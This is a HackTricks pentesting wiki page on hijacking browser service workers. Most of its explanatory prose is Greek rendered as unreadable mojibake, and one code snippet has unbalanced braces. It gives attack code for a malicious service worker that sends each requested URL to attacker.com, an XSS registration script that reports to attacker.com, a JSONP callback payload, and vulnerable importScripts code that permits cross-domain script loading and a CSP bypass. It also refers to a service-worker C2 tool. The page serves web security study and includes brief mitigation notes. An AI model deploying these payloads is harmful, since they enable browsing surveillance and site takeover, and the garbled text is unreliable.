# Abusing Service Workers



{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ÎˆÎ½Î±Ï‚ **service worker** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î® ÏƒÎ±Ï‚ ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÏƒÎºÎ®Î½Î¹Î¿, Î¾ÎµÏ‡Ï‰ÏÎ¹ÏƒÏ„Î¬ Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ Ï€Î¿Ï… Î´ÎµÎ½ Î±Ï€Î±Î¹Ï„Î¿ÏÎ½ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± Î® Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Ï‡ÏÎ®ÏƒÏ„Î·, ÎµÎ½Î¹ÏƒÏ‡ÏÎ¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Ï„Î¹Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ **ÎµÎºÏ„ÏŒÏ‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ ÎºÎ±Î¹ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÏƒÎºÎ®Î½Î¹Î¿**. Î›ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿Ï…Ï‚ service workers Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ [ÎµÎ´Ï](https://developers.google.com/web/fundamentals/primers/service-workers). Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î¿Ï…Ï‚ service workers ÏƒÎµ Î­Î½Î±Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÏŒ Ï„Î¿Î¼Î­Î±, Î¿Î¹ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î½ Î­Î»ÎµÎ³Ï‡Î¿ ÏƒÏ„Î¹Ï‚ Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚ Î¼Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ ÎµÎ½Ï„ÏŒÏ‚ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… Ï„Î¿Î¼Î­Î±.


### Checking for Existing Service Workers

ÎŸÎ¹ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„ÎµÏ‚ service workers Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎ»ÎµÎ³Ï‡Î¸Î¿ÏÎ½ ÏƒÏ„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± **Service Workers** Ï„Î·Ï‚ ÎºÎ±ÏÏ„Î­Î»Î±Ï‚ **Application** ÏƒÏ„Î± **Developer Tools**. ÎœÎ¹Î± Î¬Î»Î»Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Î½Î± ÎµÏ€Î¹ÏƒÎºÎµÏ†Î¸ÎµÎ¯Ï„Îµ Ï„Î¿ [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) Î³Î¹Î± Î¼Î¹Î± Ï€Î¹Î¿ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎ® Ï€ÏÎ¿Î²Î¿Î»Î®.

### Push Notifications

ÎŸÎ¹ **Î¬Î´ÎµÎ¹ÎµÏ‚ ÎµÎ¹Î´Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ‰Î½ push** ÎµÏ€Î·ÏÎµÎ¬Î¶Î¿Ï…Î½ Î¬Î¼ÎµÏƒÎ± Ï„Î·Î½ Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„Î± ÎµÎ½ÏŒÏ‚ **service worker** Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½ÎµÎ¯ Î¼Îµ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Ï‡Ï‰ÏÎ¯Ï‚ Î¬Î¼ÎµÏƒÎ· Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Ï‡ÏÎ®ÏƒÏ„Î·. Î•Î¬Î½ Î¿Î¹ Î¬Î´ÎµÎ¹ÎµÏ‚ Î±Ï€Î¿ÏÏÎ¹Ï†Î¸Î¿ÏÎ½, Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Ï„Î¿Ï… service worker Î½Î± Î±Ï€Î¿Ï„ÎµÎ»ÎµÎ¯ ÏƒÏ…Î½ÎµÏ‡Î® Î±Ï€ÎµÎ¹Î»Î®. Î‘Î½Ï„Î¯Î¸ÎµÏ„Î±, Î· Ï‡Î¿ÏÎ®Î³Î·ÏƒÎ· Î±Î´ÎµÎ¹ÏÎ½ Î±Ï…Î¾Î¬Î½ÎµÎ¹ Ï„Î¿Ï…Ï‚ ÎºÎ¹Î½Î´ÏÎ½Î¿Ï…Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ±Î»Î±Î²Î® ÎºÎ±Î¹ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï€Î¹Î¸Î±Î½ÏÎ½ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÏ‰Î½.

## Attack Creating a Service Worker

Î“Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î²ÏÎµÎ¯Ï„Îµ:

* ÎˆÎ½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± **Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î± JS** Î±ÏÏ‡ÎµÎ¯Î± ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎºÎ±Î¹ Î¼Î¹Î± **XSS Î³Î¹Î± Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ Ï„Î¿Î½ service worker** Ï„Î¿Ï… Î±Î½ÎµÎ²Î±ÏƒÎ¼Î­Î½Î¿Ï… JS Î±ÏÏ‡ÎµÎ¯Î¿Ï…
* ÎˆÎ½Î± **ÎµÏ…Î¬Î»Ï‰Ï„Î¿ JSONP Î±Î¯Ï„Î·Î¼Î±** ÏŒÏ€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î·Î½ Î­Î¾Î¿Î´Î¿ (Î¼Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ JS ÎºÏÎ´Î¹ÎºÎ±)** ÎºÎ±Î¹ Î¼Î¹Î± **XSS** Î³Î¹Î± Î½Î± **Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ Ï„Î¿ JSONP Î¼Îµ Î­Î½Î± payload** Ï€Î¿Ï… Î¸Î± **Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Î­Î½Î±Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ service worker**.

Î£Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¸Î± Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬ÏƒÏ‰ Î­Î½Î±Î½ ÎºÏÎ´Î¹ÎºÎ± Î³Î¹Î± Î½Î± **ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Î½Î­Î¿ service worker** Ï€Î¿Ï… Î¸Î± Î±ÎºÎ¿ÏÎµÎ¹ Ï„Î¿ Î³ÎµÎ³Î¿Î½ÏŒÏ‚ `fetch` ÎºÎ±Î¹ Î¸Î± **ÏƒÏ„Î­Î»Î½ÎµÎ¹ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Ï„Ï‰Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Ï‰Î½ ÎºÎ¬Î¸Îµ URL Ï€Î¿Ï… Î±Î½Î±ÎºÏ„Î¬Ï„Î±Î¹** (Î±Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï€Î¿Ï… Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ** ÏƒÏ„Î¿Î½ **Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®** Î® Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ **ÎµÏ…Î¬Î»Ï‰Ï„Î·Ï‚ JSONP** Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
ÎšÎ±Î¹ Î±Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï€Î¿Ï… Î¸Î± **ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ®ÏƒÎµÎ¹ Ï„Î¿Î½ ÎµÏÎ³Î±Î¶ÏŒÎ¼ÎµÎ½Î¿** (Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï€Î¿Ï… Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Î¼Î¹Î± **XSS**). Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î­Î½Î± **GET** Î±Î¯Ï„Î·Î¼Î± Î¸Î± ÏƒÏ„Î±Î»ÎµÎ¯ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Ï„Ï‰Î½ **ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Ï‰Î½** **Î³Î½Ï‰ÏƒÏ„Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚** Î±Î½ Î· **ÎºÎ±Ï„Î±Ï‡ÏÏÎ·ÏƒÎ·** Ï„Î¿Ï… service worker Î®Ï„Î±Î½ ÎµÏ€Î¹Ï„Ï…Ï‡Î®Ï‚ Î® ÏŒÏ‡Î¹:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
Î£Îµ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· ÎºÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ ÎµÏ…Î¬Î»Ï‰Ï„Î¿Ï… JSONP endpoint, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î²Î¬Î»ÎµÏ„Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ `var sw`. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
There is a **C2** dedicated to the **exploitation of Service Workers** called [**Shadow Workers**](https://shadow-workers.github.io) that will be very useful to abuse these vulnerabilities.

The **24-hour cache directive** limits the life of a malicious or compromised **service worker (SW)** to at most 24 hours after an XSS vulnerability fix, assuming online client status. To minimize vulnerability, site operators can lower the SW script's Time-To-Live (TTL). Developers are also advised to create a [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) for rapid deactivation.

## Abusing `importScripts` in a SW via DOM Clobbering

The function **`importScripts`** called from a Service Worker can **import a script from a different domain**. If this function is called using a **parameter that an attacker could** modify he would be able to **import a JS script from his domain** and get XSS.

**This even bypasses CSP protections.**

**Example vulnerable code:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### ÎœÎµ DOM Clobbering

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ Ï„Î¹ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ DOM Clobbering, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Î•Î¬Î½ Ï„Î¿ URL/domain Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ SW Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ **`importScripts`** ÎµÎ¯Î½Î±Î¹ **Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± HTML ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿**, ÎµÎ¯Î½Î±Î¹ **Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Ï„Î¿ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… DOM Clobbering** Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î¿ SW **Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Î­Î½Î± script Î±Ï€ÏŒ Ï„Î¿ Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚ domain**.

Î“Î¹Î± Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï…Ï„Î¿Ï, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿Î½ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿ Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚.

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
